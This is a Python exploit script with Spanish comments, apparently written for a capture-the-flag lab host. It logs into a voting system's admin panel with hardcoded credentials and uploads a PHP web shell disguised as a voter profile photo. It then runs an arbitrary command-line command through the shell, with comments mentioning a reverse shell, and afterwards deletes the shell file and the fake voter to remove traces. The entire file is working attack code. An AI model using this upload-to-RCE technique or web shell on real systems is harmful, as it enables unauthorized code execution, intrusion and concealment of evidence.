#!/usr/bin/python3

import requests, argparse
import signal, re

# --- Variables globales
url = "http://10.10.10.239"
username = "lanz"
session = requests.Session()

# --- Funciones del programa.
# CTRL+C
def def_handler(sig, frame):
    print("\nSal1end0...\n")
    exit(1)

signal.signal(signal.SIGINT, def_handler)

# Ejecucion remota de comandos
def rce_arbitrary_file_up(command):
    try:
        data_get = {
            "xmd" : command
        }
        # La web antes no se demoraba tanto, en la ultima prueba toma más tiempo en responder, le damos 10 segundos
        r = session.get(url + '/images/quesedice.php', params=data_get, timeout=10)
        if r.text != "":
            print("\n" + r.text)
        else:
            pass
    except requests.exceptions.Timeout as e:
        print("[+] Obteniendo reverse shell... (Si no es que la web se esta demorando mucho en responder, modificale el timeout (peppoSad)).\n")
        pass

    exit()

# --- Recibimos el comando como argumento
parse = argparse.ArgumentParser()
parse.add_argument('-c', dest='command', type=str, default='whoami', help='Comando a ejecutar en el sistema')
args = parse.parse_args()

# Login
print("[+] Iniciando sesión como el admin.")
data_post = {
    "username" : "admin",
    "password" : "@LoveIsInTheAir!!!!",
    "login" : ""
}
r = session.post(url + '/admin/login.php', data=data_post)
if "Neovic Devierte" not in r.text:
    print("[!] Error al logearnos como admin")
    exit(1)

print("[+] Listos, subiendo archivo .php como foto de perfil :P")
# Creamos Votante
data_file = [
    ('photo',
        ('quesedice.php', "<?php $command=shell_exec($_GET['xmd']); echo $command; ?>", 'application/x-php'))]
data_post = {
    "firstname" : username,
    "lastname" : username,
    "password" : username,
    "add" : ""
}
r = session.post(url + '/admin/voters_add.php', data=data_post, files=data_file)
if "Voter added successfully" not in r.text:
    print("[!] Error al crear el votante")
    exit(1)

print("[+] Ejecutando %s en el sistema." % (args.command))
rce_arbitrary_file_up(args.command) # comando que queramos

# Borramos archivo .php del sistema y borramos al votante.
rce_arbitrary_file_up("del c:\\xampp\\htdocs\\omrs\\images\\quesedice.php") # borramos el archivo quesedice.php del sistema

r = session.get(url + '/admin/voters.php')
# |_ En caso de muchos usuarios, extraemos la info del usuario lanz
# |__ Buscamos en que parte esta de toda la web
position_user = r.text.find(username)
# |__ Tomamos la posicion y extraemos la porcion de texto que este desde ella hasta 300 caracteres más
rtext_user_id = r.text[position_user:position_user+300]
# |__ Extraemos el id
id_user = re.findall(r"<a href='#edit_photo' data-toggle='modal' class='pull-right photo' data-id='(.*?)'", rtext_user_id)[0]

data_post = {
    "id" : id_user,
    "delete" : ""
}
r = session.post(url + '/admin/voters_delete.php', data=data_post)
